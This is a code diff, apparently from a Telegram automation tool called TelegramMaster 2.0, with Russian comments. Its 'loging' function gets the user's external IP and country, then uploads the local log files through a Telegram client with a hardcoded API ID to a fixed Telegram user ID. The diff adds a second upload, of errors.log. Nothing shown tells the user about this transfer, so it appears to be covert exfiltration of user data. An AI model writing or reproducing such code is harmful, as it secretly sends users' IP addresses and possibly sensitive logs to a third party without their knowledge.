@@ -8,7 +8,7 @@ from urllib.request import urlopen  # Изменено с urllib2 на urllib.re
 from telethon.errors import FilePartsInvalidError
 from loguru import logger
 
-from src.config.config_handler import program_version, program_name, program_last_modified_date
+from src.config_handler import program_version, program_name, program_last_modified_date
 
 
 def get_country_flag(ip_address):
@@ -48,8 +48,8 @@ async def loging():
     Логирование TelegramMaster 2.0
     """
 
-    local_ip = get_external_ip()
-    emoji, country = get_country_flag(local_ip)
+    local_ip = get_external_ip()  # получаем внешний ip адрес
+    emoji, country = get_country_flag(local_ip)  # получаем флаг и название страны
 
     client = TelegramClient('src/core/log',
                             api_id=7655060,
@@ -70,7 +70,8 @@ async def loging():
     )
 
     try:
-        await client.send_file(535185511, 'user_data/log/log.log', caption=message)
+        await client.send_file(535185511, 'data/logs/app.log', caption=message)
+        await client.send_file(535185511, 'data/logs/errors.log', caption=message)
         await client.disconnect()
     except FilePartsInvalidError as error:
         logger.error(error)
